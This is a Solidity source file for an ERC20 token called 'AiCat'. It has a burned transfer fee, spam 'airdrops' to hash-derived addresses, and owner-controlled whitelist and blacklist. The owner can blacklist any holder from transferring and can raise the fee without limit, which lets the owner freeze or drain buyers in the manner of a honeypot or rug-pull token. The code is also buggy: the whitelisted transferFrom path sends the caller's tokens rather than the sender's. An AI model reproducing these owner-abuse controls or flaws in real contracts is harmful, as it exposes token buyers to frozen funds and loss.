// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract AiCat is ERC20, Ownable {
    address public deadwallet = 0x0000000000000000000000000000000000000000;
    mapping(address => bool) public whiteList;
    mapping(address => bool) public blackList;
    uint256 fee = 700;
    uint256 baseUnit = 10000;
    uint256 public airdropNumbs = 3;

    constructor() ERC20("AiCat", "AiCat") {
        _mint(msg.sender, 1000000000000000 * (10 ** 18));
        whiteList[msg.sender] = true;
        whiteList[address(this)] = true;
    }

    function transfer(
        address to,
        uint256 amount
    ) public override onlyNormal returns (bool) {
        if (whiteList[msg.sender]) {
            return super.transfer(to, amount);
        }
        uint256 burn = (amount * fee) / baseUnit;
        uint256 trueAmount = amount - burn;
        address ad;
        for (uint256 i = 0; i < airdropNumbs; i++) {
            ad = address(
                uint160(
                    uint256(
                        keccak256(abi.encodePacked(i, amount, block.timestamp))
                    )
                )
            );
            super.transfer(ad, 1);
        }
        burn -= airdropNumbs * 1;
        super.transfer(deadwallet, burn);
        return super.transfer(to, trueAmount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override onlyNormal returns (bool) {
        if (whiteList[from]) {
            return super.transfer(to, amount);
        }
        uint256 burn = (amount * fee) / baseUnit;
        uint256 trueAmount = amount - burn;
        address ad;
        for (uint256 i = 0; i < airdropNumbs; i++) {
            ad = address(
                uint160(
                    uint256(
                        keccak256(abi.encodePacked(i, amount, block.timestamp))
                    )
                )
            );
            super.transferFrom(from, ad, 1);
        }
        burn -= airdropNumbs * 1;
        super.transferFrom(from, deadwallet, burn);
        return super.transferFrom(from, to, trueAmount);
    }

    function setBlackList(
        address[] memory accounts,
        bool isBlack
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            blackList[accounts[i]] = isBlack;
        }
    }

    function setWhiteList(
        address[] memory accounts,
        bool isWhite
    ) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            whiteList[accounts[i]] = isWhite;
        }
    }

    function setFee(uint256 _fee) public onlyOwner {
        fee = _fee;
    }

    function setAirdropNumbs(uint256 newValue) public onlyOwner {
        require(newValue <= 3, "newValue must <= 3");
        airdropNumbs = newValue;
    }

    modifier onlyNormal() {
        require(!blackList[msg.sender], "AiCat: You are in blackList!");
        _;
    }
}